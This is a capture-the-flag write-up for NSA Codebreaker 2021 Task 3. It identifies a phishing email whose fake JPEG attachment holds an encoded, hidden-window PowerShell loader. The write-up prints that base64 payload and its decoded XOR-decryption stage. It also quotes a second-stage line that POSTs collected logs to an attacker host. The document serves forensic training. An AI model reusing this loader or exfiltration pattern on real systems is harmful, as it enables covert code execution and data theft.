---
title: NSA Codebreaker Challenge 2021 Task 3
draft: false
tags:
  - ctf
  - nsa
  - cbc
  - codebreaker
  - forensics
---

# Task 3: Email Analysis

> With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don’t remember anything particularly weird from earlier, but it was a few weeks back, so they’re not sure. OOPS has provided a subset of the user’s inbox from the day of the communication. Identify the message ID of the malicious email and the targeted server.

I began by unzipping the `email.zip` archive, and it shows 23 EML files. I began going through each file, simply by opening it up using MacOS’s Mail app. This could be done by any application that supports email clients, such as Thunderbird, etc. A few of the emails contain attachments, such as images, PowerPoints, and Spreadsheets, but specifically, `message_9.eml` contains 3 images, one of which does not properly display in the mail client. I saved the file, `sam1.jpg` and ran some file analysis on it. Using

```
file sam1.jpg
>> sam1.jpg: ASCII text, with very long lines, with no line terminators
```

We see it is not a JPEG file. I then used

```
cat sam1.jpg
```

to see the contents of the file, and received a very intriguing response:

```powershell
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABjAHQAaAB5AC4AaQBuAHYAYQBsAGkAZAAvAGMAaABhAGkAcgBtAGEAbgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEANwAzAAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA==
```

So `message_9.eml` is obviously the malicious email, so opening it with any text editor, we will see the message ID is [161585571500.22130.11520738994728587539@oops.net](mailto:161585571500.22130.11520738994728587539@oops.net). Okay, 1/2 done. No we need to figure out the domain name of the server that received the POST request. Let’s start by decoding the obvious base64 using

```
echo JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABjAHQAaAB5AC4AaQBuAHYAYQBsAGkAZAAvAGMAaABhAGkAcgBtAGEAbgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEANwAzAAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA== | base64 --decode
```

```powershell
$bytes = [System.IO.File]::ReadAllBytes('chairman')
$prev = [byte] 173
$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})
Write-Output([System.Text.Encoding]::UTF8.GetString($dec))
#iex([System.Text.Encoding]::UTF8.GetString($dec))
```

We can then execute this PowerShell file to output the expression being invoked by iex(). Running `pwsh sam1.ps1` will output another PowerShell script, and we will see `Invoke-WebRequest -uri http://vrqgb.invalid:8080 -Method Post -Body $global:log`, at the very bottom, which is our POST request being made to ‘vrqgb.invalid’. I saved the PowerShell script generated from `sam1.ps1` as `malicious.ps1` for future-use in later tasks.